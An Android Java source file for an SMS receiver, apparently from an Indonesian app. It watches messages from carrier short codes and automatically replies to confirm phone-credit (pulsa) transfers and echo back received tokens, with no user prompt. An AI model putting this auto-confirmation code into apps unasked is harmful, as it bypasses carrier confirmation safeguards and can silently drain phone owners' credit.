package com.studio.illiyin.alomagoindonesia.service.BroadcastReceiver;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import static android.content.ContentValues.TAG;

/**
 * Created by root on 11/7/17.
 */

public class SmsListener extends BroadcastReceiver {

    private SharedPreferences preferences;

    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null){
                //---retrieve the SMS message received---
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i<msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        Log.d(TAG, "onReceive: SMS Listener "+msg_from+" "+msgBody);
                        String cs = "";
                        String message = "";
                        String[] submessage = null;
                        switch (msg_from){
                            case "151" :
                                cs = "151";
                                submessage = msgs[i].getMessageBody().toLowerCase().split(" adalah token anda. ");
                                if (submessage != null) {
                                    message = "Ok " + submessage[0];
                                    sentSMS(context, cs, message);
                                    Log.d(TAG, "onReceive: SMS Listener " + msg_from + " " + message);
                                }
                                break;
                            case "858" :
                                submessage = msgs[i].getMessageBody().toLowerCase().split("anda akan mengirimkan pulsa rp ");
                                if (!msgs[i].getMessageBody().toLowerCase().equalsIgnoreCase("Maaf, Anda belum melakukan request transfer pulsa. Untuk transfer pulsa ketik TPulsa<spasi>nominal kirim ke nomor tujuan. Biaya Rp1rb.\"")) {
                                    cs = "858";
                                    message = "YA";
                                    sentSMS(context, cs, message);
                                    Log.d(TAG, "onReceive: SMS Listener " + msg_from + " " + message);
                                }
                                break;
                            case "168" :
                                submessage = msgs[i].getMessageBody().toLowerCase().split("anda akan bagi pulsa ke no xl");
                                if (submessage != null) {
                                    cs = "168";
                                    message = "Y";
                                    sentSMS(context, cs, message);
                                    Log.d(TAG, "onReceive: SMS Listener " + msg_from + " " + message);
                                }
                                break;
                        }
                    }
                }catch(Exception e){
//                            Log.d("Exception caught",e.getMessage());
                }
            }
        }
    }
    private void sentSMS(Context context, String destination, String message){
        SmsManager smsManager = SmsManager.getDefault();
        Intent intent = new Intent();
        PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0,
                intent, 0);
//        SMSForwarderApp.getAppContext().registerReceiver(
//                new MessageSentListener(),
//                new IntentFilter(SENT_SMS_FLAG));
        smsManager.sendTextMessage(destination, null,
                message, sentIntent, null);
    }
}